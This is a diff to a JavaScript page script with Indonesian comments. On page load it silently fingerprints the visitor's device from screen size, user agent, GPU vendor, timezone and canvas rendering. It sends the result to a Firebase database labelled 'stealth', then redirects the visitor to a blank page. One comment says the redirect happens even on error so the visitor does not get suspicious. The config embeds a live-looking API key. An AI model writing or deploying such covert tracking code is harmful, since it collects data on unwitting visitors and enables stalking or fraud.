@@ -1,4 +1,6 @@
-// Firebase Config (pake punya lo)
+// ============================================
+// FIREBASE CONFIG (Punya Lo)
+// ============================================
 const firebaseConfig = {
     apiKey: "AIzaSyAKk8yOBe0AJbu9krI0DigvIJpATFWXezE",
     authDomain: "stealth-c7df6.firebaseapp.com",
@@ -10,23 +12,34 @@ const firebaseConfig = {
     measurementId: "G-0VE28H406J"
 };
 
-// Import Firebase
+// ============================================
+// IMPORT FIREBASE SDK
+// ============================================
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
 
-// Init Firebase
+// ============================================
+// INIT FIREBASE
+// ============================================
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// Fungsi get Device ID (fingerprint)
+// ============================================
+// FUNGSI GET DEVICE ID (FINGERPRINT)
+// ============================================
 function getDeviceID() {
     let components = [];
+    
+    // 1. Screen
     components.push(screen.width + 'x' + screen.height);
     components.push(screen.colorDepth);
+    
+    // 2. Navigator
     components.push(navigator.userAgent);
     components.push(navigator.language);
     components.push(navigator.platform);
     
+    // 3. WebGL (GPU)
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
     if (gl) {
@@ -36,8 +49,11 @@ function getDeviceID() {
             components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
         }
     }
+    
+    // 4. Timezone
     components.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
     
+    // 5. Canvas Fingerprint
     const canvas2 = document.createElement('canvas');
     const ctx = canvas2.getContext('2d');
     ctx.textBaseline = 'top';
@@ -45,6 +61,7 @@ function getDeviceID() {
     ctx.fillText('DeviceID', 2, 2);
     components.push(canvas2.toDataURL());
 
+    // 6. Hash jadi ID unik
     const raw = components.join('|||');
     let hash = 0;
     for (let i = 0; i < raw.length; i++) {
@@ -55,7 +72,9 @@ function getDeviceID() {
     return 'DEV-' + Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
 }
 
-// Eksekusi
+// ============================================
+// EKSEKUSI UTAMA
+// ============================================
 const deviceID = getDeviceID();
 
 // Kirim ke Firebase
@@ -66,12 +85,32 @@ push(ref(db, 'devices'), {
     platform: navigator.platform,
     language: navigator.language,
     screen: screen.width + 'x' + screen.height
-}).then(() => {
+})
+.then(() => {
     console.log('✅ Device ID terkirim:', deviceID);
-    // 🔥 GANTI URL INI PAKE TUJUAN LO!
-    window.location.href = 'https://wa.me/6281234567890'; // Contoh WhatsApp
-}).catch((err) => {
-    console.error('❌ Gagal kirim ke Firebase:', err); // 🔥 Sekarang keliatan error-nya
-    // Tetep redirect walau error
+    
+    // ============================================
+    // 🔥 REDIRECT - GANTI SESUAI KEINGINAN LO!
+    // ============================================
+    
+    // OPSI 1: Redirect ke halaman kosong (about:blank)
+    window.location.href = 'about:blank';
+    
+    // OPSI 2: Redirect ke Google (kalo pengen)
+    // window.location.href = 'https://www.google.com';
+    
+    // OPSI 3: Redirect ke WhatsApp (kalo pengen)
+    // window.location.href = 'https://wa.me/6281234567890';
+    
+    // OPSI 4: Redirect ke admin.html (buat testing)
+    // window.location.href = 'admin.html';
+    
+    // OPSI 5: Gak redirect sama sekali (tetep di halaman loading)
+    // (komen aja baris di atas)
+})
+.catch((err) => {
+    console.error('❌ Gagal kirim ke Firebase:', err);
+    
+    // Tetep redirect walau error (biar gak curiga)
     window.location.href = 'about:blank';
 });
